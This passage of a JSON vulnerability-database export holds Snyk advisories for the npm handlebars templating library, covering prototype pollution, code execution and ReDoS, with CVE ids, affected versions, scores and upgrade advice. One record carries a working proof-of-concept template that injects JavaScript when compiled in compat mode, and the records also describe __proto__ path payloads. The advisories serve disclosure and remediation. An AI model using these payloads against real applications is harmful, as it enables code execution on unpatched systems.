\r\n</script>\r\n```\n## Remediation\nUpgrade `handlebars` to version 4.7.7 or higher.\n## References\n- [GitHub Commit](https://github.com/handlebars-lang/handlebars.js/commit/b6d3de7123eebba603e321f04afdbae608e8fea8)\n",
        "created_at": "2021-01-08T17:25:21Z",
        "updated_at": "2024-03-11T09:53:57Z",
        "problems": [
          {
            "id": "CVE-2021-23369",
            "source": "CVE"
          },
          {
            "id": "CWE-94",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.7.7 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.7.7"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.7.7"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2021-01-08T17:08:45Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-02-15T11:50:51Z",
            "references": [
              {
                "url": "https://github.com/handlebars-lang/handlebars.js/commit/b6d3de7123eebba603e321f04afdbae608e8fea8",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-HANDLEBARS-1279029",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Prototype Pollution when selecting certain compiling options to compile templates coming from an untrusted source.\r\n\r\n### POC\r\n```\r\n<script src=\"https://cdn.jsdelivr.net/npm/handlebars@latest/dist/handlebars.js\"></script> \r\n<script> \r\n// compile the template \r\n\r\nvar s2 = `{{'a/.\") || alert(\"Vulnerable Handlebars JS when compiling in compat mode'}}`; \r\nvar template = Handlebars.compile(s2, { \r\ncompat: true \r\n}); \r\n// execute the compiled template and print the output to the console console.log(template({})); \r\n</script>\r\n```\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `handlebars` to version 4.7.7 or higher.\n## References\n- [GitHub Commit](https://github.com/handlebars-lang/handlebars.js/commit/f0589701698268578199be25285b2ebea1c1e427)\n",
        "created_at": "2021-05-04T08:31:48Z",
        "updated_at": "2024-03-11T09:53:57Z",
        "problems": [
          {
            "id": "CVE-2021-23383",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.7.7 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.7.7"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<4.7.7"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "medium",
            "score": 5.6,
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L/E:P/RL:O/RC:C"
          }
        ],
        "effective_severity_level": "medium",
        "slots": [
          {
            "disclosure_time": "2021-01-08T08:30:14Z",
            "exploit": "Proof of Concept",
            "publication_time": "2021-05-04T08:56:24Z",
            "references": [
              {
                "url": "https://github.com/handlebars-lang/handlebars.js/commit/f0589701698268578199be25285b2ebea1c1e427",
                "title": "GitHub Commit"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-HANDLEBARS-173692",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Prototype Pollution. Templates may alter an Objects' prototype, thus allowing an attacker to execute arbitrary code on the server.\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `handlebars` to version 3.0.7, 4.0.13, 4.1.2 or higher.\n## References\n- [GitHub Commit](https://github.com/handlebars-lang/handlebars.js/commit/de6ded486f84cf685e37e1bd719aad7211176241)\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/7372d4e9dffc9d70c09671aa28b9392a1577fd86)\n- [GitHub Issue](https://github.com/wycats/handlebars.js/issues/1495)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/755)\n",
        "created_at": "2019-02-14T16:46:18Z",
        "updated_at": "2024-03-06T14:09:20Z",
        "problems": [
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.0.7 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.0.7"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": "<3.0.7,>=4.0.0 <4.0.13,>=4.1.0 <4.1.2"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2018-12-28T20:34:57Z",
            "exploit": "Not Defined",
            "publication_time": "2019-02-14T17:52:50Z",
            "references": [
              {
                "url": "https://github.com/handlebars-lang/handlebars.js/commit/de6ded486f84cf685e37e1bd719aad7211176241",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/wycats/handlebars.js/commit/7372d4e9dffc9d70c09671aa28b9392a1577fd86",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/wycats/handlebars.js/issues/1495",
                "title": "GitHub Issue"
              },
              {
                "url": "https://www.npmjs.com/advisories/755",
                "title": "NPM Security Advisory"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-HANDLEBARS-174183",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Prototype Pollution. A Prototype Pollution allowing Remote Code Execution can be exploited using the constructor, via the 'lookup' helper.\r\nThis vulnerability is due to an incomplete fix for: `SNYK-JS-HANDLEBARS-173692`\n\n## Details\n\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `__proto__`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\n\nThere are two main ways in which the pollution of prototypes occurs:\n\n-   Unsafe `Object` recursive merge\n    \n-   Property definition by path\n    \n\n### Unsafe Object recursive merge\n\nThe logic of a vulnerable recursive merge function follows the following high-level model:\n```\nmerge (target, source)\n\n  foreach property of source\n\n    if property exists and is an object on both the target and the source\n\n      merge(target[property], source[property])\n\n    else\n\n      target[property] = source[property]\n```\n<br>  \n\nWhen the source object contains a property named `__proto__` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\n\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\n\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\n\n### Property definition by path\n\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\n\nIf the attacker can control the value of “path”, they can set this value to `__proto__.myValue`. `myValue` is then assigned to the prototype of the class of the object.\n\n## Types of attacks\n\nThere are a few methods by which Prototype Pollution can be manipulated:\n\n| Type |Origin  |Short description |\n|--|--|--|\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\n\n## Affected environments\n\nThe following environments are susceptible to a Prototype Pollution attack:\n\n-   Application server\n    \n-   Web server\n\n-   Web browser\n    \n\n## How to prevent\n\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\n    \n2.  Require schema validation of JSON input.\n    \n3.  Avoid using unsafe recursive merge functions.\n    \n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\n    \n5.  As a best practice use `Map` instead of `Object`.\n\n### For more information on this vulnerability type:\n\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\nUpgrade `handlebars` to version 3.0.7, 4.1.2, 4.0.14 or higher.\n## References\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/cd38583216dce3252831916323202749431c773e)\n- [GitHub Issue](https://github.com/wycats/handlebars.js/issues/1495)\n- [SNYK-JS-HANDLEBARS-173692](https://snyk.io/vuln/SNYK-JS-HANDLEBARS-173692)\n",
        "created_at": "2019-04-14T11:55:45Z",
        "updated_at": "2024-03-06T13:55:41Z",
        "problems": [
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 3.0.7 to fix this vulnerability",
                "details": {
                  "upgrade_package": "3.0.7"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=3.0.0 <3.0.7,>=4.1.0 <4.1.2,>=4.0.0 <4.0.14"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2019-04-13T06:31:34Z",
            "exploit": "Not Defined",
            "publication_time": "2019-04-14T06:31:34Z",
            "references": [
              {
                "url": "https://github.com/wycats/handlebars.js/commit/cd38583216dce3252831916323202749431c773e",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/wycats/handlebars.js/issues/1495",
                "title": "GitHub Issue"
              },
              {
                "url": "https://snyk.io/vuln/SNYK-JS-HANDLEBARS-173692",
                "title": "SNYK-JS-HANDLEBARS-173692"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-HANDLEBARS-469063",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Prototype Pollution",
        "description": "## Overview\n\n[handlebars](https://www.npmjs.com/package/handlebars) is a extension to the Mustache templating language.\n\n\nAffected versions of this package are vulnerable to Prototype Pollution.\nTemplates may alter an Object's `__proto__` and `__defineGetter__` properties, which may allow an attacker to execute arbitrary code on the server through crafted payloads.\n\n## Details\nPrototype Pollution is a vulnerability affecting JavaScript. Prototype Pollution refers to the ability to inject properties into existing JavaScript language construct prototypes, such as objects. JavaScript allows all Object attributes to be altered, including their magical attributes such as `_proto_`, `constructor` and `prototype`. An attacker manipulates these attributes to overwrite, or pollute, a JavaScript application object prototype of the base object by injecting other values.  Properties on the `Object.prototype` are then inherited by all the JavaScript objects through the prototype chain. When that happens, this leads to either denial of service by triggering JavaScript exceptions, or it tampers with the application source code to force the code path that the attacker injects, thereby leading to remote code execution.\r\n\r\nThere are two main ways in which the pollution of prototypes occurs:\r\n\r\n-   Unsafe `Object` recursive merge\r\n    \r\n-   Property definition by path\r\n    \r\n\r\n### Unsafe Object recursive merge\r\n\r\nThe logic of a vulnerable recursive merge function follows the following high-level model:\r\n```\r\nmerge (target, source)\r\n\r\n  foreach property of source\r\n\r\n    if property exists and is an object on both the target and the source\r\n\r\n      merge(target[property], source[property])\r\n\r\n    else\r\n\r\n      target[property] = source[property]\r\n```\r\n<br>  \r\n\r\nWhen the source object contains a property named `_proto_` defined with `Object.defineProperty()` , the condition that checks if the property exists and is an object on both the target and the source passes and the merge recurses with the target, being the prototype of `Object` and the source of `Object` as defined by the attacker. Properties are then copied on the `Object` prototype.\r\n\r\nClone operations are a special sub-class of unsafe recursive merges, which occur when a recursive merge is conducted on an empty object: `merge({},source)`.\r\n\r\n`lodash` and `Hoek` are examples of libraries susceptible to recursive merge attacks.\r\n\r\n### Property definition by path\r\n\r\nThere are a few JavaScript libraries that use an API to define property values on an object based on a given path. The function that is generally affected contains this signature: `theFunction(object, path, value)`\r\n\r\nIf the attacker can control the value of “path”, they can set this value to `_proto_.myValue`. `myValue` is then assigned to the prototype of the class of the object.\r\n\r\n## Types of attacks\r\n\r\nThere are a few methods by which Prototype Pollution can be manipulated:\r\n\r\n| Type |Origin  |Short description |\r\n|--|--|--|\r\n| **Denial of service (DoS)**|Client  |This is the most likely attack. <br>DoS occurs when `Object` holds generic functions that are implicitly called for various operations (for example, `toString` and `valueOf`). <br> The attacker pollutes `Object.prototype.someattr` and alters its state to an unexpected value such as `Int` or `Object`. In this case, the code fails and is likely to cause a denial of service.  <br>**For example:** if an attacker pollutes `Object.prototype.toString` by defining it as an integer, if the codebase at any point was reliant on `someobject.toString()` it would fail. |\r\n |**Remote Code Execution**|Client|Remote code execution is generally only possible in cases where the codebase evaluates a specific attribute of an object, and then executes that evaluation.<br>**For example:** `eval(someobject.someattr)`. In this case, if the attacker pollutes `Object.prototype.someattr` they are likely to be able to leverage this in order to execute code.|\r\n|**Property Injection**|Client|The attacker pollutes properties that the codebase relies on for their informative value, including security properties such as cookies or tokens.<br>  **For example:** if a codebase checks privileges for `someuser.isAdmin`, then when the attacker pollutes `Object.prototype.isAdmin` and sets it to equal `true`, they can then achieve admin privileges.|\r\n\r\n## Affected environments\r\n\r\nThe following environments are susceptible to a Prototype Pollution attack:\r\n\r\n-   Application server\r\n    \r\n-   Web server\r\n    \r\n\r\n## How to prevent\r\n\r\n1.  Freeze the prototype— use `Object.freeze (Object.prototype)`.\r\n    \r\n2.  Require schema validation of JSON input.\r\n    \r\n3.  Avoid using unsafe recursive merge functions.\r\n    \r\n4.  Consider using objects without prototypes (for example, `Object.create(null)`), breaking the prototype chain and preventing pollution.\r\n    \r\n5.  As a best practice use `Map` instead of `Object`.\r\n\r\n### For more information on this vulnerability type:\r\n\r\n[Arteau, Oliver. “JavaScript prototype pollution attack in NodeJS application.” GitHub, 26 May 2018](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf)\n\n## Remediation\n\nUpgrade `handlebars` to version 4.3.0, 3.0.8 or higher.\n\n\n## References\n\n- [GitHub Commit](https://github.com/handlebars-lang/handlebars.js/commit/156061eb7707575293613d7fdf90e2bdaac029ee)\n\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/213c0bbe3c4bd83a534d67384e5afa0000347ff6)\n\n- [GitHub Issue](https://github.com/wycats/handlebars.js/issues/1558)\n\n- [Reference](https://www.npmjs.com/advisories/1164)\n\n- [Release Notes](https://github.com/wycats/handlebars.js/blob/master/release-notes.md#v430---september-24th-2019)\n",
        "created_at": "2019-09-25T13:12:40Z",
        "updated_at": "2024-03-11T09:53:47Z",
        "problems": [
          {
            "id": "CVE-2019-19919",
            "source": "CVE"
          },
          {
            "id": "CWE-1321",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.3.0 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.3.0"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=4.0.0 <4.3.0,<3.0.8"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.3,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2019-09-24T15:14:43Z",
            "exploit": "Not Defined",
            "publication_time": "2019-09-25T14:33:59Z",
            "references": [
              {
                "url": "https://github.com/handlebars-lang/handlebars.js/commit/156061eb7707575293613d7fdf90e2bdaac029ee",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/wycats/handlebars.js/commit/213c0bbe3c4bd83a534d67384e5afa0000347ff6",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/wycats/handlebars.js/issues/1558",
                "title": "GitHub Issue"
              },
              {
                "url": "https://www.npmjs.com/advisories/1164",
                "title": "Reference"
              },
              {
                "url": "https://github.com/wycats/handlebars.js/blob/master/release-notes.md%23v430---september-24th-2019",
                "title": "Release Notes"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-HANDLEBARS-480388",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Denial of Service (DoS)",
        "description": "## Overview\n[handlebars](https://www.npmjs.com/package/handlebars) is an extension to the Mustache templating language.\n\nAffected versions of this package are vulnerable to Denial of Service (DoS). The package's parser may be forced into an endless loop while processing specially-crafted templates, which may allow attackers to exhaust system resources leading to Denial of Service.\n\n## Details\n\nDenial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.\n\nThe Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.\n\nLet’s take the following regular expression as an example:\n```js\nregex = /A(B|C+)+D/\n```\n\nThis regular expression accomplishes the following:\n- `A` The string must start with the letter 'A'\n- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.\n- `D` Finally, we ensure this section of the string ends with a 'D'\n\nThe expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`\n\nIt most cases, it doesn't take very long for a regex engine to find a match:\n\n```bash\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD\")'\n0.04s user 0.01s system 95% cpu 0.052 total\n\n$ time node -e '/A(B|C+)+D/.test(\"ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX\")'\n1.79s user 0.02s system 99% cpu 1.812 total\n```\n\nThe entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.\n\nMost Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.\n\nLet's look at how our expression runs into this problem, using a shorter string: \"ACCCX\". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:\n1. CCC\n2. CC+C\n3. C+CC\n4. C+C+C.\n\nThe engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.\n\nFrom there, the number of steps the engine must use to validate a string just continues to grow.\n\n| String | Number of C's | Number of steps |\n| -------|-------------:| -----:|\n| ACCCX | 3 | 38\n| ACCCCX | 4 | 71\n| ACCCCCX | 5 | 136\n| ACCCCCCCCCCCCCCX | 14 | 65,553\n\n\nBy the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.\n\n## Remediation\nUpgrade `handlebars` to version 4.4.5 or higher.\n## References\n- [GitHub Commit](https://github.com/wycats/handlebars.js/commit/8d5530ee2c3ea9f0aee3fde310b9f36887d00b8b)\n- [GitHub Issue](https://github.com/wycats/handlebars.js/issues/1579)\n- [NPM Security Advisory](https://www.npmjs.com/advisories/1300)\n",
        "created_at": "2019-11-05T12:16:29Z",
        "updated_at": "2024-03-11T09:53:47Z",
        "problems": [
          {
            "id": "CVE-2019-20922",
            "source": "CVE"
          },
          {
            "id": "CWE-400",
            "source": "CWE"
          }
        ],
        "coordinates": [
          {
            "remedies": [
              {
                "description": "Upgrade to version 4.4.5 to fix this vulnerability",
                "details": {
                  "upgrade_package": "4.4.5"
                },
                "type": "indeterminate"
              }
            ],
            "representation": [
              {
                "resource_path": ">=4.0.0 <4.4.5"
              }
            ]
          }
        ],
        "severities": [
          {
            "source": "Snyk",
            "level": "high",
            "score": 7.5,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
          }
        ],
        "effective_severity_level": "high",
        "slots": [
          {
            "disclosure_time": "2019-10-30T15:57:14Z",
            "exploit": "Not Defined",
            "publication_time": "2019-11-05T12:19:43Z",
            "references": [
              {
                "url": "https://github.com/wycats/handlebars.js/commit/8d5530ee2c3ea9f0aee3fde310b9f36887d00b8b",
                "title": "GitHub Commit"
              },
              {
                "url": "https://github.com/wycats/handlebars.js/issues/1579",
                "title": "GitHub Issue"
              },
              {
                "url": "https://www.npmjs.com/advisories/1300",
                "title": "NPM Security Advisory"
              }
            ]
          }
        ]
      }
    },
    {
      "id": "SNYK-JS-HANDLEBARS-534478",
      "type": "vulnerabilities",
      "attributes": {
        "title": "Arbitrary Code Execution",
